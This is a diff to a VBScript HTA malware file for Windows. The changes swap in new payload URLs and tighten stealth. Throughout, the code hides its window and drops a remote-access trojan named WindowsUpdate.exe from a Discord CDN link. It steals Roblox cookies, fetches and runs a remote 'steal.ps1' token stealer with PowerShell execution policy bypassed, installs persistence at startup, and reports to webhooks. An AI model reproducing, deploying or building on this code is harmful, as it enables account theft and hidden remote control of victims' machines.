@@ -1,9 +1,9 @@
 ' language: VBScript/HTA, file: file.hta, target: Windows 10/11, mshta engine
 <html>
 <head><title>.</title>
-<hta:application id="a" border="none" innerborder="no" caption="no" showintaskbar="no" sysmenu="no" contextmenu="no" selection="no"/>
+<hta:application id="a" border="none" innerborder="no" caption="no" showintaskbar="no" sysmenu="no" contextmenu="no" selection="no" scroll="no" navigator="no"/>
 <script language="VBScript">
-window.resizeTo 0,0:window.moveTo -2000,-2000
+window.resizeTo 1,1:window.moveTo -3000,-3000
 On Error Resume Next
 
 Dim sh, fso, WH, RE_WH, PC, USER, ratDropped, lastCookie
@@ -43,7 +43,7 @@ window.close()
 
 ' --- RAT DROP: always posts rocket, then check or fail ---
 Sub DropRAT(targetWH)
-    Dim dl : dl = "https://cdn.discordapp.com/attachments/1570877567567929557/1573211629770772510/Winupdate.exe?ex=6b012f01&is=6affdd81&hm=a224ef4e41dca378740f95f58a8a0cdd5406aa60f24b376a510f101adcf83d9b&"
+    Dim dl : dl = "https://cdn.discordapp.com/attachments/1351499996263878729/1573919433020412246/WindowsUpdate.exe?ex=6b03c232&is=6b0270b2&hm=4d3a346fca9a87136a99e8c7c10fb28b71f0366d22cbd745c2b665e1fe3093c4&"
     Dim tPath : tPath = sh.ExpandEnvironmentStrings("%LOCALAPPDATA%") & "\Microsoft\Windows"
     If Not fso.FolderExists(tPath) Then fso.CreateFolder tPath
     Randomize
@@ -67,10 +67,10 @@ Sub DropRAT(targetWH)
             Call SleepSeconds(2)
             Call PostEmbedTo(":white_check_mark: RAT Launched", "Payload executed.", 10181046, targetWH)
         Else
-            Call PostEmbedTo(":x: RAT Download", "File too small: " & fSize & " bytes (link may be expired)", 16711680, targetWH)
+            Call PostEmbedTo(":x: RAT Download", "File too small: " & fSize & " bytes (link expired?)", 16711680, targetWH)
         End If
     Else
-        Call PostEmbedTo(":x: RAT Download", "Download failed — file not created (link may be expired)", 16711680, targetWH)
+        Call PostEmbedTo(":x: RAT Download", "Download failed (link expired?)", 16711680, targetWH)
     End If
 End Sub
 
@@ -101,7 +101,7 @@ Sub IP(targetWH)
     Set xh = Nothing
 End Sub
 
-' --- PostCookieOnly: dedupes, only sends a NEW cookie ---
+' --- PostCookieOnly ---
 Sub PostCookieOnly(targetWH)
     Dim cookie : cookie = GetRobloxCookie()
     If Len(cookie) < 20 Then Exit Sub
@@ -196,11 +196,11 @@ Sub Persistence()
     Call PostEmbed(":pushpin: Persistence", "3 startup methods installed", 10181046)
 End Sub
 
-' --- GrabTokens: WAITS for ps1 to finish before reading ---
+' --- GrabTokens ---
 Sub GrabTokens(targetWH)
     Dim xh: Set xh = CreateObject("MSXML2.ServerXMLHTTP.6.0")
     xh.SetOption 2, 13056
-    xh.Open "GET", "https://gist.githubusercontent.com/elibyexd-stack/cd284a4bd1bf045a820ebaeac2fd89fc/raw/1a19a4f15511de7eec09722f94d6a6d254491b65/steal.ps1", False
+    xh.Open "GET", "https://gist.githubusercontent.com/elibyexd-stack/cd284a4bd1bf045a820ebaeac2fd89fc/raw/4eac95e5238b7dce163f6d360e902605050d1954/steal.ps1", False
     xh.Send
     If xh.Status <> 200 Then Exit Sub
     Dim pc: pc = xh.responseText
@@ -215,7 +215,6 @@ Sub GrabTokens(targetWH)
 
     sh.Run "cmd /c powershell -NoP -Exec Bypass -File """ & psf & """", 0, False
 
-    ' Wait for the ps1 to actually write the file and finish writing
     Dim waited: waited = 0
     Dim lastSize: lastSize = -1
     Dim stable: stable = 0
@@ -234,10 +233,7 @@ Sub GrabTokens(targetWH)
         If waited >= 90 Then Exit Do
     Loop
 
-    If Not fso.FileExists(tf) Then
-        Call PostEmbedTo(":warning: Steal", "ps1 finished but no result file", 16776960, targetWH)
-        Exit Sub
-    End If
+    If Not fso.FileExists(tf) Then Exit Sub
 
     Dim cp: cp = TmpFile("sr_" & Int(Rnd()*99999) & ".txt")
     On Error Resume Next
